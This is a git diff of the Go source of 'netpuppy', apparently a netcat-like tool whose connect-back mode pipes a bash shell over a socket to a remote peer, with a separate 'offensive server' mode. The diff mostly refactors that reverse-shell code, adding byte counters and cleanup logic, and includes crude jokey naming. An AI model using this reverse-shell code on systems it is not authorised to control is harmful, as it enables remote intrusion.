@@ -16,16 +16,43 @@ import (
 	"github.com/trshpuppy/netpuppy/utils"
 )
 
-func Run(c conn.ConnectionGetter) {
-	type closers struct {
-		socketToClose conn.SocketInterface
-		shellToClose  *shell.RealShell
-		filesToClose  []*os.File
-	}
-	var closeUs closers
+// WRITECOOTER STAYS!!!!! TO COMMEMORATE THE DUMBEST BUG I'VE EVER PERSONALLY ENCOUNTERED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+type WriteCooter struct {
+	Writer io.Writer
+	Count  uint64
+}
 
+func (wc *WriteCooter) Write(dataInPipe []byte) (int, error) {
+	bytesSent, err := wc.Writer.Write(dataInPipe)
+	wc.Count += uint64(bytesSent)
+
+	return bytesSent, err
+}
+
+type ReadCounter struct {
+	Reader io.Reader
+	Count  uint64
+}
+
+func (rc *ReadCounter) Read(dataInPipe []byte) (int, error) {
+	bytesRead, err := rc.Reader.Read(dataInPipe)
+	rc.Count += uint64(bytesRead)
+
+	return bytesRead, err
+}
+
+// This struct is being used in sneakyExit() (when there is a rev shell)
+// .... so we can close things (since os.Exit() doesn't run defer statements)
+type Closers struct {
+	socketToClose conn.SocketInterface
+	shellToClose  *shell.RealShell
+	filesToClose  []*os.File
+}
+
+func Run(c conn.ConnectionGetter) {
 	// Parse flags from user, attach to struct:
 	flagStruct := utils.GetFlags()
+	var closeUs Closers
 
 	// Create peer instance based on user input:
 	var thisPeer *conn.Peer = conn.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)
@@ -46,10 +73,10 @@ func Run(c conn.ConnectionGetter) {
 	} else {
 		socketInterface = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
 	}
-	defer socketInterface.Close()
 	closeUs.socketToClose = socketInterface
+	defer socketInterface.Close()
 
-	// If shell flag is true, start shell:
+	// If shell flag is true, get shell cmd (to start later)
 	var shellInterface *shell.RealShell
 	var shellErr error
 
@@ -59,7 +86,7 @@ func Run(c conn.ConnectionGetter) {
 
 		if shellErr != nil {
 			errString := "Error starting shell: " + shellErr.Error()
-			socketInterface.Write([]byte(errString))
+			socketInterface.WriteShit([]byte(errString))
 			socketInterface.Close()
 			os.Exit(1)
 		}
@@ -69,11 +96,12 @@ func Run(c conn.ConnectionGetter) {
 	listenForSIGINT(socketInterface, thisPeer)
 
 	// ................................................. CONNECT-BACK w/ SHELL .................................................
+
 	// If we are the connect-back peer & the user wants a shell, start the shell here:
 	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
 		// First, make a function we can call which send errors into the socket
 		// .... & handles closing files, etc. before quitting (sneaky).
-		sneakyExit := func(err error, closeUs closers) {
+		sneakyExit := func(err error, closeUs Closers) {
 			// We are the rev-shell, let's limit output to stdout/err,
 			// .... so send error through socket, then quit:
 			socketPresent := closeUs.socketToClose != nil
@@ -86,7 +114,7 @@ func Run(c conn.ConnectionGetter) {
 			if socketPresent {
 				// We could maybe send a custom signal to tell the other peer to close immediately...
 				// .... [[instead of it continuing to try to use the socket]]
-				socketInterface.Write([]byte(errMsg))
+				socketInterface.WriteShit([]byte(errMsg))
 				closeUs.socketToClose.Close()
 			}
 
@@ -99,7 +127,7 @@ func Run(c conn.ConnectionGetter) {
 			// If there are open files (in the list), close them:
 			if filesPresent {
 				for _, file := range closeUs.filesToClose {
-					fmt.Printf("Closing %v\n", file.Name())
+					// fmt.Printf("Closing %v\n", file.Name())
 					file.Close()
 				}
 			}
@@ -114,9 +142,9 @@ func Run(c conn.ConnectionGetter) {
 			customErr := fmt.Errorf("Error starting shell: %v\n", err)
 			sneakyExit(customErr, closeUs)
 		}
+		closeUs.filesToClose = append(closeUs.filesToClose, master, pts)
 		defer master.Close()
 		defer pts.Close()
-		closeUs.filesToClose = append(closeUs.filesToClose, master, pts)
 
 		// Hook up slave/pts device to bash process:
 		// .... (literally just point it to the file descriptors)
@@ -131,31 +159,43 @@ func Run(c conn.ConnectionGetter) {
 			customErr := fmt.Errorf("Error starting shell: %v\n", err)
 			sneakyExit(customErr, closeUs)
 		}
+		closeUs.shellToClose = shellInterface
 		defer shellInterface.Shell.Process.Release()
 		defer shellInterface.Shell.Process.Kill()
-		closeUs.shellToClose = shellInterface
 
 		var routineErr error
-		commandPending := true
+		// commandPending := true
 
 		// Copy output from master device to socket:
 		go func(socket conn.SocketInterface, master *os.File) {
-			_, err := io.Copy(socket.GetWriter(), master)
+			// Create instance of WriteCounter for io.Copy (dest arg):
+			copyCounter := &WriteCooter{Writer: socket.GetWriter()}
+
+			_, err := io.Copy(copyCounter, master)
 			if err != nil {
 				routineErr = fmt.Errorf("Error copying master device to socket: %v\n", err)
+				// fmt.Printf("Current write count: %v\n", copyCounter.Count)
 				return
 			}
-			commandPending = false
+			// fmt.Printf("Current write count: %v\n", copyCounter.Count)
+			routineErr = fmt.Errorf("Error copying master device to socket: %v\n", err)
+			return
 		}(socketInterface, master)
 
 		// Copy output from socket to master device:
 		go func(socket conn.SocketInterface, master *os.File) {
-			commandPending = true
-			_, err := io.Copy(master, socket.GetReader())
+			// Create ReadCounter instance:
+			socketReader := &ReadCounter{Reader: socket.GetReader()}
+
+			_, err := io.Copy(master, socketReader)
 			if err != nil {
 				routineErr = fmt.Errorf("Error copying socket to master device: %v\n", err)
+				//fmt.Printf("Current read count: %v\n", socketReader.Count)
 				return
 			}
+			//fmt.Printf("Current read count: %v\n", socketReader.Count)
+			routineErr = fmt.Errorf("Error copying socket to master device: %v\n", err)
+			return
 		}(socketInterface, master)
 
 		// Start for loop with timeout to keep things running smoothly:
@@ -165,13 +205,11 @@ func Run(c conn.ConnectionGetter) {
 			if routineErr != nil {
 				// Send error through socket, then quit:
 				sneakyExit(routineErr, closeUs)
-			}
-
-			// Otherwise, 3 millisecond timeout:
-			if commandPending {
+			} else {
 				// Timeout:
 				time.Sleep(3 * time.Millisecond)
 			}
+
 		}
 	} else {
 		// ................................................. OFFENSIVE SERVER .................................................
@@ -271,6 +309,7 @@ func Run(c conn.ConnectionGetter) {
 					if len(dataReadFromSocket) > 0 {
 						c <- dataReadFromSocket
 					}
+
 					if err != nil {
 						if errors.Is(err, io.EOF) {
 							continue
@@ -289,7 +328,7 @@ func Run(c conn.ConnectionGetter) {
 			// Called from the select block (user has entered input)
 			// .... Check length so we can clear channel, but not send blank data:
 			if len(data) > 0 {
-				_, erR := socketInterface.Write([]byte(data))
+				_, erR := socketInterface.WriteShit([]byte(data))
 				if erR != nil {
 					customErr := fmt.Errorf("Error writing user input buffer to socket: %v\n", erR)
 					nonSneakyExit(customErr)
